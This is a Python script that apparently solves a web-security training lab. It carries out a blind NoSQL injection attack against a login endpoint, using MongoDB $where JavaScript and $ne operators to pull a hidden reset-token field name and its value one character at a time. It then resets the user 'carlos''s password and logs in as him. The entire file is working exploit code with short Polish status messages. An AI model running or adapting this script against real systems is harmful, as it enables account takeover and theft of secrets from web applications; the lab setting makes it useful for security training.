import sys
import requests
import re
import string

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'

session = requests.Session()
session.get(burp_url)

burp_headers = {"Content-Type": "application/json"}
found_length = ""
found_chars = ""
found_secret_phrase = ""
found_phrase_length = ""
secret_phrase_value = ""

chars = string.ascii_lowercase + string.digits+ string.ascii_uppercase + string.punctuation
chars = chars.replace('$', '').replace('.', '').replace('*', '').replace('^', '')
numbers = list(range(100))
#numbers = string.digits

'''
for char in numbers:
    burp_json = {
        "$where": f"function() {{if (Object.keys(this)[{char}].match('password') ) return 1; else 0; }}",
        "password": {"$ne": "invalid"},
        "username": "carlos"
    }
    response = session.post(login_url, json=burp_json, headers=burp_headers)

    if "Account locked: please reset your password" in response.text:
        found_number = char
        print(f"Zaczynamy od wartosci: {found_number}\r\n", end='')
        break
'''

found_number = 4

for char in numbers:
    burp_json = {
        "$where": f"function() {{if (Object.keys(this)[{found_number}].length == {char} ) return 1; else 0; }}",
        "password": {"$ne": "invalid"},
        "username": "carlos"
    }
    response = session.post(login_url, json=burp_json, headers=burp_headers)

    if "Account locked: please reset your password" in response.text:
        found_length = char
        print(f"Dlugosc tej wartosci to: {found_length}\r\n", end='')
        break

for i in range(int(found_length)):
    for char in chars:
        burp_json = {
            "$where": f"function() {{if (Object.keys(this)[{found_number}].match(/^{found_secret_phrase + char}/)) return 1; else 0; }}",
            "password": {"$ne": "invalid"},
            "username": "carlos"
        }

        response = session.post(login_url, json=burp_json, headers=burp_headers)

        if "Account locked: please reset your password" in response.text:
            found_secret_phrase += char
            print(f"\rUkryta fraza to: {found_secret_phrase}", end='',flush=True)
            break

digits = list(range(51))

for numer in digits:
    burp_json = {
        "$where": f"function() {{if (this.{found_secret_phrase}.length == {numer} ) return 1; else 0; }}",
        "password": {"$ne": "invalid"},
        "username": "carlos"
    }
    response = session.post(login_url, json=burp_json, headers=burp_headers)

    if "Account locked: please reset your password" in response.text:
        found_phrase_length = numer
        print(f"Dlugosc tej frazy to: {found_phrase_length}\r\n", end='', flush=True)
        break

for i in range(int(found_phrase_length)):
    for char in chars:
        burp_json = {
            "$where": f"function() {{if (this.{found_secret_phrase}.match(/^{secret_phrase_value + char}/) ) return 1; else 0; }}",
            "password": {"$ne": "invalid"},
            "username": "carlos"
        }
        response = session.post(login_url, json=burp_json, headers=burp_headers)

        if "Account locked: please reset your password" in response.text:
            secret_phrase_value += char
            print(f"\rWartosc tej frazy to: {secret_phrase_value}", end='', flush=True)
            break



reset_url = burp_url + '/forgot-password?' + found_secret_phrase + '=' + secret_phrase_value

response = session.get(reset_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)

burp_data = {"csrf": csrf, "unlockToken": secret_phrase_value, "new-password-1": "12345678", "new-password-2": "12345678"}
session.post(reset_url, data=burp_data)

response = session.get(login_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
burp_data = {"csrf": csrf,"username": "carlos", "password": "12345678"}
session.post(login_url, data=burp_data)
